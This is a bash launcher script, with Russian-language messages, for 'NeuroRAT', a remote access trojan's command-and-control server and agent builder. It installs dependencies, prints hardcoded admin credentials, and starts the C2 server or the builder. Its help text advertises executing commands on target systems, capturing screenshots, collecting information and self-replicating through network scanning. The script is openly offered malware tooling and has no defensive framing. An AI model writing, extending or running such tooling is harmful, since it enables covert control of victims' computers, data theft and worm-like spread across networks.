#!/bin/bash
# NeuroRAT C2 Server Startup Script

# Определение цветов для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${GREEN}"
echo "  _   _                      ____      _  _____ "
echo " | \ | | ___ _   _ _ __ ___ |  _ \    / \|_   _|"
echo " |  \| |/ _ \ | | | '__/ _ \| |_) |  / _ \ | |  "
echo " | |\  |  __/ |_| | | | (_) |  _ <  / ___ \| |  "
echo " |_| \_|\___|\__,_|_|  \___/|_| \_\/_/   \_\_|  "
echo -e "${NC}"
echo -e "${YELLOW}C2 Server и Билдер${NC}"
echo ""

# Проверка зависимостей
echo -e "${BLUE}[*] Проверка зависимостей...${NC}"

check_dependency() {
    if ! command -v $1 &> /dev/null; then
        echo -e "${RED}[-] $2 не найден. Установите $2 для продолжения.${NC}"
        exit 1
    else
        echo -e "${GREEN}[+] $2 найден.${NC}"
    fi
}

check_dependency python3 "Python 3"
check_dependency pip3 "pip3"

# Установка Python зависимостей
echo -e "${BLUE}[*] Установка Python зависимостей...${NC}"
pip3 install fastapi uvicorn jinja2 python-multipart pillow psutil

# Выбор режима запуска
echo ""
echo -e "${YELLOW}Выберите режим запуска:${NC}"
echo "1) Запуск C2 сервера (стандартный режим)"
echo "2) Только сборка агентов (билдер)"
echo "3) Помощь и информация"

read -p "Выберите опцию (1-3): " choice

case $choice in
  1)
    echo -e "${GREEN}[+] Запуск C2 сервера...${NC}"
    echo -e "${BLUE}[*] Сервер будет доступен по адресу http://localhost:8088${NC}"
    echo -e "${BLUE}[*] Логин: admin / Пароль: neurorat${NC}"
    python3 server_api.py
    ;;
  2)
    echo -e "${GREEN}[+] Запуск билдера агентов...${NC}"
    echo -e "${BLUE}[*] Выполняется настройка...${NC}"
    # Запуск билдера в режиме без сервера
    python3 server_api.py --builder-only
    ;;
  3)
    echo -e "${BLUE}=== NeuroRAT C2 Server ====${NC}"
    echo "Система управления и мониторинга конечных точек."
    echo ""
    echo "Возможности сервера:"
    echo "- Мониторинг подключенных агентов"
    echo "- Выполнение команд на целевых системах"
    echo "- Сбор информации и захват скриншотов"
    echo "- Создание кастомизированных агентов"
    echo "- Саморепликация через сетевое сканирование"
    echo ""
    echo "Документация доступна в файле README.md"
    ;;
  *)
    echo -e "${RED}[-] Неверный выбор. Выход.${NC}"
    exit 1
    ;;
esac 